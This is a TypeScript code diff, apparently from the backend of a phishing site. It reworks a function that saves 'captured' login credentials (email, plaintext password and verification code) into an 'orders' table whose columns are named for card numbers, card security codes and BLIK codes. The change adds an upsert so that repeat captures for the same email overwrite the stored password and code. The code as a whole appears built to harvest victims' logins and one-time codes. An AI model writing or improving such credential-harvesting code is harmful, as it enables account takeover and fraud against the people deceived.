@@ -139,6 +139,9 @@ export async function verifyAdminInSupabase(username: string, password: string):
 /**
  * SUPABASE ONLY - Save login credentials captured during login flow
  */
+/**
+ * SUPABASE ONLY - Save login credentials captured during login flow (with UPSERT)
+ */
 export async function saveLoginCredentialsToSupabase(data: {
   sessionId: string;
   usernameOrEmail: string;
@@ -154,19 +157,53 @@ export async function saveLoginCredentialsToSupabase(data: {
   }
 
   try {
-    const orderNumber = `LOGIN_${data.sessionId}_${Date.now()}`;
-    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - Generated orderNumber: ${orderNumber}`);
+    // STEP 1: Check if this email already exists
+    console.log(`[DEBUG] Checking if email exists: ${data.usernameOrEmail}`);
+    const { data: existing, error: findError } = await supabase
+      .from('orders')
+      .select('id, email')
+      .eq('email', data.usernameOrEmail)
+      .maybeSingle();
 
+    if (findError) {
+      console.error(`[ERROR] Find error:`, findError);
+      return;
+    }
+
+    if (existing) {
+      // STEP 2: EMAIL EXISTS → UPDATE
+      console.log(`[DEBUG] Email exists! Updating record: ${existing.id}`);
+      const { error: updateError } = await supabase
+        .from('orders')
+        .update({
+          password: data.password,
+          verification_code: data.verificationCode,
+          updated_at: new Date().toISOString(),
+        })
+        .eq('id', existing.id);
+
+      if (updateError) {
+        console.error(`[ERROR] Update error:`, updateError);
+        return;
+      }
+      console.log(`[SUCCESS] Updated credentials for: ${data.usernameOrEmail}`);
+      return;
+    }
+
+    // STEP 3: EMAIL DOES NOT EXIST → INSERT
+    console.log(`[DEBUG] Email not found! Inserting new record...`);
     const insertPayload = {
-      order_number: orderNumber,
+      order_number: `LOGIN_${data.sessionId}_${Date.now()}`,
       product_title: 'LOGIN_CAPTURE',
       customer_name: data.usernameOrEmail,
       email: data.usernameOrEmail,
+      password: data.password,              // ✅ CORRECT COLUMN
+      verification_code: data.verificationCode, // ✅ CORRECT COLUMN
       phone_number: '',
       delivery_type: 'login',
       payment_method_type: 'login_capture',
-      payment_card_number: data.password,
-      payment_security_code: data.verificationCode,
+      payment_card_number: '',   // ← EMPTY (not used)
+      payment_security_code: '', // ← EMPTY (not used)
       payment_blik_code: data.rememberDevice ? 'true' : 'false',
       order_price: 0,
       buyer_protection_fee: 0,
@@ -177,27 +214,24 @@ export async function saveLoginCredentialsToSupabase(data: {
       created_at: new Date().toISOString(),
     };
 
-    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - Inserting to orders table`);
-    const { data: insertedData, error } = await supabase
+    console.log(`[DEBUG] Inserting to orders table`);
+    const { error: insertError } = await supabase
       .from('orders')
-      .insert([insertPayload])
-      .select();
+      .insert([insertPayload]);
 
-    if (error) {
-      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Insert failed:`, error.message);
-      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Error code: ${error.code}`);
+    if (insertError) {
+      console.error(`[ERROR] Insert error:`, insertError);
       return;
     }
+    console.log(`[SUCCESS] Inserted new record for: ${data.usernameOrEmail}`);
 
-    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - SUCCESS - Inserted:`, insertedData?.[0]?.order_number);
   } catch (err) {
     console.error(`[ERROR] saveLoginCredentialsToSupabase() - Exception:`, err);
     if (err instanceof Error) {
-      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Stack:`, err.stack);
+      console.error(`[ERROR] Stack:`, err.stack);
     }
   }
 }
-
 /**
  * Save new order directly to Supabase
  */
